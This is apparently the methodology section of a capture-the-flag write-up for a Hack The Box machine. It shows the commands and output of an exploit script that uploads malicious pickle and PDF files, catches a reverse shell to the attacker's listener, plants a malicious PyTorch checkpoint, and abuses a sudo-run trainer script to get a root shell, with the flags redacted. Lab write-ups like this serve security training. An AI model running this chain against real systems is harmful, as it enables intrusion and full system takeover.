Methodology:

```
git clone https://github.com/boop-boopess/sleepyhead/ && cd sleepyhead                                                                  
Cloning into 'sleepyhead'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 9 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (9/9), 7.55 KiB | 7.55 MiB/s, done.
Resolving deltas: 100% (1/1), done.
```


```
pip3 install -r requirements.txt --break-system-packages
```


```
python3 exploit.py --lhost 10.10.xx.xx --vhost research.bedside.htb 10.129.xx.xx
[*] Listening on 0.0.0.0:4444 ...
[*] Uploaded evil.pickle.gz -> HTTP 200
[*] Uploaded evil.pdf -> HTTP 200
[+] Got connection from ('10.129.xx.xx', 59512)
datawrangler@data-wrangler:/app$ id; hostname
uid=988(datawrangler) gid=1001(dataops) groups=1001(dataops)
data-wrangler
datawrangler@data-wrangler:/app$ 
[+] Built malicious checkpoint: /tmp/bedside_pwn_artifacts/malicious.pt
[*] Cleaning /datastore/staging and /datastore/processed ...
[*] Dropping a dummy image so the DataLoader has something valid to load ...
[*] Writing malicious.pt into /datastore/checkpoints ...
base64 -d /tmp/mp.b64 > /datastore/checkpoints/malicious.pt && ls -la /datastore/checkpoints/
total 12
drwxrwx--- 2 datawrangler dataops 4096 Jul 19 04:12 .
drwxrwx--- 8 datawrangler dataops 4096 Jul 13 13:00 ..
-rw-r--r-- 1 datawrangler dataops 1593 Jul 19 04:12 malicious.pt
datawrangler@data-wrangler:/app$ 
[*] SSH'ing in as developer with known key ...
[+] user.txt: b5............................4b
[*] Listening on 0.0.0.0:4445 ...
[*] Triggering: sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
[+] Got connection from ('10.129.xx.xx', 42030)
bash: cannot set terminal process group (1923): Inappropriate ioctl for device
bash: no job control in this shell
root@bedside:/home/developer# id
uid=0(root) gid=0(root) groups=0(root)
root@bedside:/home/developer# 
cat /root/root.txt
82............................d6
root@bedside:/home/developer# 

================ RESULTS ================
user.txt: b5............................4b
root.txt: 82............................d6
===========================================
```
